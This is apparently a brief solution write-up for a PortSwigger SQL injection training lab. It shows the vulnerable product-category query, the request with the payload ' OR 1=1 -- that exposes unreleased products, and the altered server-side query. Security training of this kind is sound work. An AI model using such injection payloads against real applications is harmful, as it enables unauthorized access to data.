# [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

## Lab

This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

## Exploit

```http
GET /filter?category='+OR+1%3d1+-- HTTP/1.1
...
```

the server-side query:

```sql
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1`
```
